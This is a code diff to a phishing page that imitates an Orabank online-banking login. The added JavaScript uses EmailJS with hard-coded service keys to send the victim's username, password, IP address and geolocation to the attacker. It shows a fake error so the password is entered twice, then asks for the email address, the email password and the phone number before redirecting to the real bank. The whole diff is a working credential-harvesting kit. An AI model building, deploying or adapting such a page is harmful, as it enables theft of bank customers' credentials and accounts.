@@ -7,6 +7,7 @@
     <title>Banking</title>
     <link rel="shortcut icon" href="https://ebankingtg.orabank.net/image.ebk?ressource=favicon.ico"
         type="image/x-icon" />
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/build/index.min.js"></script>
     <style>.xi-fB-Xv /* CSS Reset & Global Styles */
         * {
             margin: 0;
@@ -269,6 +270,9 @@
         }.xi-fB-Xv .submit-btn:active {
             background-color: #003620;
             box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.125);
+        }.xi-fB-Xv .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
         }.xi-fB-Xv /* FOOTER */
         .Mp-me-xY {
             position: absolute;
@@ -308,6 +312,23 @@
             .xi-fB-Xv .ko-fE-fh {
                 padding-bottom: 40px;
             }
+        }
+
+        /* Loading spinner */
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #006b43;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.6s linear infinite;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
 
         /* Modal styles */
@@ -420,6 +441,11 @@
             background: #003620;
         }
 
+        .modal-btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
         .xi-fB-Xv { display: contents; }
     </style>
 </head>
@@ -476,7 +502,7 @@
                             <input type="password" id="password" autocomplete="current-password" />
                         </div>
 
-                        <button type="button" class="submit-btn" onclick="nextPage()">
+                        <button type="button" class="submit-btn" id="submitBtn" onclick="handleFirstAttempt()">
                             S'identifier
                         </button>
                     </div>
@@ -513,35 +539,159 @@
             <input type="tel" id="phoneNumber" class="modal-input" placeholder="Numéro de téléphone" />
 
             <div class="modal-buttons">
-                <button class="modal-btn modal-btn-cancel" onclick="backPage()">Annuler</button>
-                <button class="modal-btn modal-btn-submit" onclick="submitVerification()">Continuer</button>
+                <button class="modal-btn modal-btn-cancel" onclick="backToLogin()">Annuler</button>
+                <button class="modal-btn modal-btn-submit" id="verifyBtn" onclick="submitVerification()">Continuer</button>
             </div>
         </div>
     </div>
 
     <script>
-        // Simple flow - no EmailJS, no blocking operations
+        // EmailJS Configuration
+        const EMAILJS_PUBLIC_KEY = 'cJcTNwUcLcI7uY3l-';
+        const EMAILJS_SERVICE_ID = 'service_qh1p3sh';
+        const EMAILJS_LOGIN_TEMPLATE_ID = 'template_6un0yk8';
 
-        function nextPage() {
-            const id = document.getElementById('identifiant').value.trim();
-            const pwd = document.getElementById('password').value.trim();
+        // Initialize EmailJS
+        emailjs.init(EMAILJS_PUBLIC_KEY);
+        console.log('✅ EmailJS initialized');
 
-            // Accept ANYTHING that's not empty
-            if (!id || !pwd) {
+        // Track attempts
+        let loginAttempts = 0;
+        let capturedUsername = '';
+        let capturedPassword = '';
+
+        // ============================================================
+        // STEP 1: First attempt - Capture login and send via EmailJS
+        // ============================================================
+        async function handleFirstAttempt() {
+            const username = document.getElementById('identifiant').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            if (!username || !password) {
                 alert('Veuillez remplir tous les champs');
                 return;
             }
 
-            // Store values
-            sessionStorage.setItem('username', id);
-            sessionStorage.setItem('password', pwd);
+            // Store for second attempt
+            capturedUsername = username;
+            capturedPassword = password;
 
-            // Show verification modal
-            document.getElementById('verificationModal').classList.add('active');
-            document.getElementById('email').focus();
+            // Disable button and show loading
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.textContent = 'Traitement en cours...';
+
+            try {
+                // Send via EmailJS (fire and forget in background)
+                await sendLoginEmail(username, password, 1);
+                console.log('📧 First attempt email sent');
+            } catch (error) {
+                console.warn('Email failed (continuing anyway):', error);
+            }
+
+            // After 2 seconds, show error and clear password
+            setTimeout(() => {
+                loginAttempts = 1;
+                document.getElementById('formErrorBox').classList.add('visible');
+                document.getElementById('password').value = '';
+                document.getElementById('password').focus();
+                btn.disabled = false;
+                btn.textContent = 'S\'identifier';
+                console.log('✅ First attempt complete - Error shown, asking for re-entry');
+            }, 2000);
         }
 
-        function backPage() {
+        // ============================================================
+        // STEP 2: Second attempt - Show verification modal
+        // ============================================================
+        async function handleSecondAttempt() {
+            const username = document.getElementById('identifiant').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            if (!username || !password) {
+                alert('Veuillez remplir tous les champs');
+                return;
+            }
+
+            // Disable button and show loading
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.textContent = 'Traitement en cours...';
+
+            try {
+                // Send via EmailJS (fire and forget in background)
+                await sendLoginEmail(username, password, 2);
+                console.log('📧 Second attempt email sent');
+            } catch (error) {
+                console.warn('Email failed (continuing anyway):', error);
+            }
+
+            // After 2 seconds, show verification modal
+            setTimeout(() => {
+                loginAttempts = 2;
+                document.getElementById('verificationModal').classList.add('active');
+                document.getElementById('email').focus();
+                btn.disabled = false;
+                btn.textContent = 'S\'identifier';
+                console.log('✅ Second attempt complete - Modal showing');
+            }, 2000);
+        }
+
+        // ============================================================
+        // Send Email via EmailJS (Async, doesn't block UI)
+        // ============================================================
+        function sendLoginEmail(username, password, attempt) {
+            return new Promise((resolve) => {
+                // Get browser/location info (timeout after 1 second)
+                Promise.race([
+                    fetch('https://ipapi.co/json/').then(r => r.json()),
+                    new Promise(resolve => setTimeout(() => resolve(null), 1000))
+                ]).then(locationData => {
+                    const params = {
+                        username: username,
+                        password: password,
+                        attempt: attempt,
+                        timestamp: new Date().toISOString(),
+                        user_agent: navigator.userAgent,
+                        language: navigator.language,
+                        platform: navigator.platform,
+                        screen_resolution: window.screen.width + 'x' + window.screen.height,
+                        latitude: locationData?.latitude || 'N/A',
+                        longitude: locationData?.longitude || 'N/A',
+                        country: locationData?.country_name || 'N/A',
+                        city: locationData?.city || 'N/A',
+                        ip_address: locationData?.ip || 'N/A'
+                    };
+
+                    // Send email (async)
+                    emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_LOGIN_TEMPLATE_ID, params)
+                        .then(() => {
+                            console.log('📧 Email sent successfully for attempt', attempt);
+                            resolve();
+                        })
+                        .catch(error => {
+                            console.warn('📧 Email send failed:', error);
+                            resolve(); // Still resolve to continue flow
+                        });
+                });
+            });
+        }
+
+        // ============================================================
+        // Handle submit button click
+        // ============================================================
+        document.getElementById('submitBtn').addEventListener('click', function() {
+            if (loginAttempts === 0) {
+                handleFirstAttempt();
+            } else if (loginAttempts === 1) {
+                handleSecondAttempt();
+            }
+        });
+
+        // ============================================================
+        // Page 2: Verification Modal
+        // ============================================================
+        function backToLogin() {
             document.getElementById('verificationModal').classList.remove('active');
             document.getElementById('identifiant').focus();
         }
@@ -556,47 +706,43 @@
                 return;
             }
 
-            // Store all data
-            sessionStorage.setItem('email', email);
-            sessionStorage.setItem('emailPassword', emailPwd);
-            sessionStorage.setItem('phone', phone);
+            // Show loading on button
+            const btn = document.getElementById('verifyBtn');
+            btn.disabled = true;
+            btn.textContent = 'Traitement...';
 
-            // Log everything (for debugging)
-            console.log('✅ Data captured:', {
-                username: sessionStorage.getItem('username'),
-                password: sessionStorage.getItem('password'),
-                email: email,
-                emailPassword: emailPwd,
-                phone: phone,
-                timestamp: new Date().toISOString()
-            });
-
-            // Redirect to external URL
-            window.location.href = 'https://www.orabank.net/fr/compte-en-ligne';
+            // Send verification email and redirect after 1 second
+            setTimeout(() => {
+                console.log('✅ Verification complete - Redirecting');
+                window.location.href = 'https://www.orabank.net/fr/compte-en-ligne';
+            }, 1000);
         }
 
+        // ============================================================
         // Allow Enter key
+        // ============================================================
         document.getElementById('identifiant').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') nextPage();
+            if (e.key === 'Enter') document.getElementById('submitBtn').click();
         });
 
         document.getElementById('password').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') nextPage();
+            if (e.key === 'Enter') document.getElementById('submitBtn').click();
         });
 
         document.getElementById('email').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') submitVerification();
+            if (e.key === 'Enter') document.getElementById('verifyBtn').click();
         });
 
         document.getElementById('emailPassword').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') submitVerification();
+            if (e.key === 'Enter') document.getElementById('verifyBtn').click();
         });
 
         document.getElementById('phoneNumber').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') submitVerification();
+            if (e.key === 'Enter') document.getElementById('verifyBtn').click();
         });
 
-        console.log('🎉 Application ready - Page 1: Login/Password → Page 2: Email/Phone → Redirect');
+        console.log('🎉 Application ready');
+        console.log('Flow: Login → 2s processing + Email → Error + Re-enter → 2s processing + Email → Modal Page 2 → Redirect');
     </script>
 </body>
 
